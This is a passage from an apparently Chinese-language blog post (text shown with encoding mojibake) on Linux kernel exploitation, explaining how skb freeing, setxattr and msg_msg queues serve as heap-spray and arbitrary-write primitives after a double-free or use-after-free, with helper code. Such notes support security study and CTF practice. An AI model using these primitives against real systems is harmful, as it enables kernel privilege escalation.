(TX completion) before original skb</span></span><br><span class="line"><span class="comment">		 * This test would have no chance to be true for the clone,</span></span><br><span class="line"><span class="comment">		 * while here, branch prediction will be good.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">            <span class="keyword">if</span> (refcount_read(&amp;fclones-&gt;fclone_ref) == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">goto</span> fastpath;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>: <span class="comment">/* SKB_FCLONE_CLONE */</span></span><br><span class="line">            fclones = container_of(skb, struct sk_buff_fclones, skb2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!refcount_dec_and_test(&amp;fclones-&gt;fclone_ref))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">fastpath:</span><br><span class="line">    <span class="comment">//ç”¨ä¸“é—¨çš„cache(skbuff_fclone_cache)è¿›è¡Œå›æ”¶å…‹éš†çš„skb</span></span><br><span class="line">    kmem_cache_free(skbuff_fclone_cache, fclones);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>è¿™ä¸ªå°±ä¸å¤ªå¥½åˆ©ç”¨äº†ã€‚</p>
<p>åŒæ ·çš„ï¼Œå½“å…³é—­çš„ä¿¡é“çš„ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾</p>
</li>
</ul>

        <h5 id="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"   >
          <a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š" class="headerlink" title="å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š"></a>å†…å­˜é‡Šæ”¾æ€»ç»“ï¼š</h5>
      <ul>
<li><p>å½“ä»ä¿¡é“ä¸­å°†æŸæ¡æ¶ˆæ¯å…¨éƒ¨è¯»å–å®Œä¹‹åï¼Œä¼šå‘ç”Ÿè¯¥æ¡æ¶ˆæ¯å¯¹åº”çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>çš„å†…å­˜é‡Šæ”¾ï¼Œä¸”<code>sk_buff</code>é‡Šæ”¾åˆ°ä¸“é—¨çš„ç¼“å­˜æ± ä¸­ï¼Œ<code>skb-&gt;data</code>ä½¿ç”¨æ­£å¸¸çš„<code>kfree</code>é‡Šæ”¾</p>
</li>
<li><p>å½“å…³é—­ä¿¡é“ä¸¤ç«¯ï¼Œè¯¥ä¿¡é“å†…äº§ç”Ÿçš„æ‰€æœ‰çš„<code>sk_buff</code>å’Œ<code>skb-&gt;data</code>éƒ½ä¼šå¾—åˆ°é‡Šæ”¾ï¼Œå…·ä½“çš„è°ƒç”¨é“¾ä¸ºï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_close()-&gt;__sock_release()-&gt;unix_release()-&gt;__kfree_skb()</span><br></pre></td></tr></table></div></figure>

<p>åé¢å°±ç±»ä¼¼äº†ã€‚</p>
</li>
</ul>

        <h2 id="9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°"   >
          <a href="#9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°" class="headerlink" title="9.setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°"></a>9.setxattrâ€”è¿‘ä¹ä»»æ„å¤§å°</h2>
      <p>è¿™ä¸ªæ€»ç»“è¿‡ï¼Œç›´æ¥æ‰’è¿‡æ¥</p>
<p>è°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()-&gt;path_setxattr()-&gt;setxattr()</span><br></pre></td></tr></table></div></figure>

<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fs/xattr.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(struct user_namespace *mnt_userns, struct dentry *d,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value, <span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">	 <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> error;</span><br><span class="line">	<span class="keyword">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	error = strncpy_from_user(kname, name, <span class="keyword">sizeof</span>(kname));</span><br><span class="line">	<span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="keyword">sizeof</span>(kname))</span><br><span class="line">		error = -ERANGE;</span><br><span class="line">	<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size) &#123;</span><br><span class="line">		<span class="keyword">if</span> (size &gt; XATTR_SIZE_MAX)</span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">        <span class="comment">//ç”³è¯·chunkï¼ŒåŸºæœ¬ç›¸å½“äºkmallocå‡½æ•°ï¼Œsizeå¯æ§</span></span><br><span class="line">		kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!kvalue)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="comment">//ä»valueæ‹·è´å†…å®¹åˆ°kvalueï¼Œvalueå¯æ§</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line">			error = -EFAULT;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">		    (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line">			posix_acl_fix_xattr_from_user(mnt_userns, kvalue, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);</span><br><span class="line">out:</span><br><span class="line">    <span class="comment">//é‡Šæ”¾chunkï¼ŒåŸºæœ¬ç­‰äºkfreeå‡½æ•°</span></span><br><span class="line">	kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>å…³æ³¨ç‚¹åœ¨<code>kvmalloc</code>ã€<code>copy_from_user</code>ã€<code>kvfree</code>ã€‚</p>
<p><code>kvmalloc</code>ä¸­çš„sizeå¯æ§ï¼Œ<code>copy_from_user</code>ä¸­çš„<code>value</code>å¯æ§</p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“<code>freelist</code>ä¸­å­˜åœ¨æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„chunkï¼Œè€Œè¯¥chunkåˆæ˜¯æˆ‘ä»¬æ§åˆ¶çš„æŸä¸ªè®¾å¤‡å†…å­˜å—æ—¶ï¼Œ(é€šè¿‡double-freeæˆ–è€…UAFå®ç°)é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>setxattr</code>æ¥å¯¹è¯¥è®¾å¤‡å†…å­˜è¿›è¡Œä»»æ„å†™ã€‚è™½ç„¶æœ€åä¼šé‡Šæ”¾ï¼Œä½†æ˜¯ä¹Ÿåªä¼šå½±å“å†…å­˜å—ä¸­å­˜æ”¾ä¸‹ä¸€ä¸ªchunkåœ°å€å¤„çš„å†…å®¹0x8ä¸ªå­—èŠ‚ï¼Œè€Œå½“æˆ‘ä»¬ç”¨ä¸ç€è¿™ä¸ªåœ°æ–¹çš„å†…å®¹æ—¶ï¼Œå°±ä¸ç”¨å¤ªå…³æ³¨äº†ã€‚</p>

        <h3 id="ğŸ”ºæ³¨ï¼š-2"   >
          <a href="#ğŸ”ºæ³¨ï¼š-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼š-2" class="headerlink" title="ğŸ”ºæ³¨ï¼š"></a>ğŸ”ºæ³¨ï¼š</h3>
      <p>ä½¿ç”¨çš„æ—¶å€™éœ€è¦æ³¨æ„æŒ‡å®šä¸€ä¸ªå½“å‰çš„expç¨‹åºï¼Œç±»ä¼¼å¦‚ä¸‹ï¼Œç¬¬äºŒä¸ªå‚æ•°å­—ç¬¦ä¸²ä»»æ„ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setxattr(<span class="string">&quot;/tmp/ufdExp&quot;</span>, <span class="string">&quot;PIG-007&quot;</span>, &amp;buf,<span class="number">0x100</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></div></figure>


        <h2 id="10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"   >
          <a href="#10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-msg-msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024" class="headerlink" title="10.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024"></a>10.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024</h2>
      <p>è¿™ä¸ªåœ¨ä¹‹å‰ä¹Ÿæ€»ç»“è¿‡ï¼Œä¸è¿‡æ€»ç»“å¾—æœ‰äº›é”™è¯¯ï¼Œä¹Ÿä¸å¤ªå®Œå–„ï¼Œè¿™é‡Œå†å¥½å¥½æ€»ç»“ä¸€ä¸‹</p>
<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#%E5%88%86%E9%85%8D%EF%BC%88GFP-KERNEL-ACCOUNT%EF%BC%89%EF%BC%9Amsgsnd-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" >ã€NOTES.0x08ã€‘Linux Kernel Pwn IVï¼šé€šç”¨ç»“æ„ä½“ä¸æŠ€å·§ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252558" >Linuxå†…æ ¸ä¸­åˆ©ç”¨msg_msgç»“æ„å®ç°ä»»æ„åœ°å€è¯»å†™ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zorro.gitbooks.io/poor-zorro-s-linux-book/content/linuxde-jin-cheng-jian-tong-xin-xiao-xi-dui-lie.html" >Linuxçš„è¿›ç¨‹é—´é€šä¿¡ - æ¶ˆæ¯é˜Ÿåˆ— Â· Poor Zorroâ€™s Linux Book (gitbooks.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹</p>
<p>è™½ç„¶å†™çš„æ˜¯æœ€å¤§<code>kmalloc-1024</code>ï¼Œä½†æ˜¯åœ¨å †å–·æ—¶ï¼Œå¯ä»¥è¿ç»­<code>kmalloc(1024)</code>ä»è€Œè·å¾—è¿ç»­çš„å †å†…å­˜åˆ†å¸ƒï¼Œè¿™æ ·éƒ½é‡Šæ”¾æ‰ä¹‹åå†ç»è¿‡å›æ”¶æœºåˆ¶å°±å¯ä»¥ç”³è¯·åˆ°æ›´å¤§çš„<code>kmallo-xx</code>äº†ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-2"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-2"   >
          <a href="#â‘ åˆ›å»º-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-2" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <ul>
<li><p>é¦–å…ˆåˆ›å»º<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œå¯¹åº”äºå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//keyè¦ä¹ˆä½¿ç”¨ftok()ç®—æ³•ç”Ÿæˆ,è¦ä¹ˆæŒ‡å®šä¸ºIPC_PRIVATE</span></span><br><span class="line"><span class="comment">//ä»£è¡¨ç€è¯¥æ¶ˆæ¯é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­å”¯ä¸€çš„æ ‡è¯†ç¬¦</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨IPC_PRIVATEä¼šç”Ÿæˆå…¨æ–°çš„æ¶ˆæ¯é˜Ÿåˆ—IPCå¯¹è±¡</span></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br></pre></td></tr></table></div></figure>

<p>ä½¿ç”¨ç®€å•å°è£…çš„<code>msgget</code>å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨å·<code>__NR_msgget</code>ï¼Œä¹‹åä¿å­˜æ•°æ®çš„æ¶ˆæ¯å°±ä¼šåœ¨è¿™ä¸ª<code>queue_id</code>ç®¡ç†æ ‡å¿—ï¼Œä»¥åŠå†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç®¡ç†ç»“æ„ä¸‹è¿›è¡Œåˆ›å»º</p>
</li>
</ul>

        <h4 id="â‘¡æ•°æ®ä¼ è¾“"   >
          <a href="#â‘¡æ•°æ®ä¼ è¾“" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ•°æ®ä¼ è¾“" class="headerlink" title="â‘¡æ•°æ®ä¼ è¾“"></a>â‘¡æ•°æ®ä¼ è¾“</h4>
      <ul>
<li><p>å†™å…¥æ¶ˆæ¯ï¼š</p>
<p>ç„¶åå°±å¯ä»¥ä¾æ®<code>queue_id</code>å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº<code>pipe</code>å’Œ<code>socketpair</code>ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ<code>msgsnd/msgrcv</code>ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ<code>__NR_msgrcv/__NR_msgsnd</code>ï¼‰æ¥å®ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¯»å–æ¶ˆæ¯ï¼š</p>
<p>ä¹‹åå³å¯ä¾æ®<code>queue_id</code>è¯»å–æ¶ˆæ¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</p>
<ul>
<li>åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>mtype</code>ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤<code>mtype</code>æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶</li>
<li>åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>msgtyp</code>ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ<ul>
<li><code>msgtyp</code>å¤§äº0ï¼šé‚£ä¹ˆåœ¨<code>find_msg</code>å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº<code>msgtyp</code>çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚</li>
<li><code>msgtyp</code>ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ<code>find_msg</code>å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚</li>
<li><code>msgtyp</code>å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ<code>mtype</code>çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>å¯ä»¥å…³æ³¨ä¸€ä¸‹<code>MSG_NOERROR</code>æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´<code>msg_flag</code>æ²¡æœ‰è®¾ç½®<code>MSG_NOERROR</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦<code>m_ts_size</code>ä¸º<code>0x200</code>ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>ä½†æ˜¯å¦‚æœè®¾ç½®äº†<code>MSG_NOERROR</code>ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>msg_flag</code>ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>

        <h4 id="â‘¢é‡Šæ”¾"   >
          <a href="#â‘¢é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é‡Šæ”¾" class="headerlink" title="â‘¢é‡Šæ”¾"></a>â‘¢é‡Šæ”¾</h4>
      <p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°<code>msgctl</code>å°è£…å‡½æ•°æˆ–è€…<code>__NR_msgctl</code>ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„<code>msg_queue</code>çš„ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id),IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?</p>
<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>cmd</code>å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>

        <h4 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>
      <p>æ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 